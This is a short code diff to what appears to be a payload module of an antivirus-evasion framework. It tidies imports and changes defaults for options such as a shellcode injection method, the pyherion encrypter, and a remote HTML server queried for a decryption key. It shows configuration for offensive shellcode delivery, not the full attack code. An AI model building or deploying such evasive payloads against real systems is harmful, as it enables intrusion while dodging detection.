@@ -35,12 +35,6 @@ module by @KillSwitch-GUI
 
 """
 
-import urllib2
-import md5
-
-from datetime import date
-from datetime import timedelta
-
 from modules.common import shellcode
 from modules.common import helpers
 from modules.common import encryption
@@ -64,8 +58,8 @@ class Payload:
                                  "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                  "inject_method" : ["Virtual", "Virtual, Void, Heap"],
                                  "sleep_time" : ["60", "Set the sleep time between HTTP Key request"],
-                                 "target_server" : ["http://www.guimp.com/", "Set target HTML server to query for decryption key"],
-                                 "html_file_name" : ["/root/Desktop/wordpress.html", "Set the output of HTML file name"]}
+                                 "target_server" : ["http://www.site.com/wordpress.html", "Set target HTML server to query for decryption key"],
+                                 "html_file_name" : ["/root/Desktop/wordpress.html", "set output path of HTML file"]}
 
         
         
